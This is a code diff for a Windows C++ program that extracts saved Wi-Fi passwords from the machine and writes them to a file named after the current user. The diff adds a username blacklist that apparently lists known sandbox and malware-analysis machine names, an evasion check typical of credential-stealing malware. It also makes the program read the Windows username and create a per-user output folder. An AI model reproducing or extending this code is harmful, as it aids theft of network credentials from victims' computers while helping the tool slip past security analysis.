@@ -14,6 +14,11 @@
 #include <stdexcept>
 #include <iomanip>
 #include <windows.h>
+#include <lmcons.h>
+#include <random>
+#include <conio.h>
+#include <algorithm>
+#include <sys/stat.h>
 
 using namespace std;
 
@@ -141,7 +146,7 @@ void recoverWifiPasswords(std::string wifi_passwords_filename)
         }
         catch (const std::exception &ex)
         {
-            merror("Unable to get the wifi password of " + i + " network");
+            merror("Unable to get the wifi password of " + i + " network -> " + ex.what());
             file << std::left << std::setw(30) << i << "|  "
                  << "ENCODING ERROR" << std::endl;
         }
@@ -150,23 +155,53 @@ void recoverWifiPasswords(std::string wifi_passwords_filename)
     mdebug("Saved all wifi passwords to " + wifi_passwords_filename);
 }
 
-int main()
+// Optional
+void user_check()
 {
+    std::vector<std::string> USERS = {"BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", "WDAGUtilityAccount", "Abby", "patex", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "fred", "server", "BvJChRPnsxn", "Harry Johnson", "SqgFOf3G", "Lucas", "mike", "PateX", "h7dk1xPr", "Louise", "User01", "test", "RGzcBUyrznReg", "OgJb6GqgK0O"};
+    
+    try
+    {
+        std::string USER = getenv("USERNAME");
+        mdebug(USER);
+        if (std::find(USERS.begin(), USERS.end(), USER) != USERS.end())
+        {
+            merror("Username: " + USER + " is blacklisted");
+        }
+        else
+        {
+            mdebug("No Debug Mode Detected by Username of Machine");
+        }
+    }
+    catch (const std::exception &e)
+    {
+        mdebug("[ERROR]: " + std::string(e.what()));
+    }
+}
 
-    std::string username = std::getenv("USER");
+
+int main()
+{   
+    user_check();
+
+    TCHAR buffer[UNLEN + 1];
+    DWORD size = UNLEN + 1;
+    GetUserName(buffer, &size);
+    
+    std::string username(buffer, buffer + size);
     std::string dir_path = "./" + username;
+
     std::string file_path = dir_path + "/wifi.txt";
 
     if (std::system(("mkdir " + dir_path).c_str()) != 0)
     {
-        std::cerr << "Error creating directory" << std::endl;
-        return 1;
+        std::cerr << "Directory " << username << " already exists." << std::endl;
     }
 
     recoverWifiPasswords("wifi.txt");
 
-    // std::cout << "\n\nPress [Enter] to close the console window..." << std::endl;
-    // while (_getch() != 13)
-    //     ;
+    std::cout << "\n\nPress [Enter] to close the console window..." << std::endl;
+    while (_getch() != 13)
+        ;
     return 0;
 }
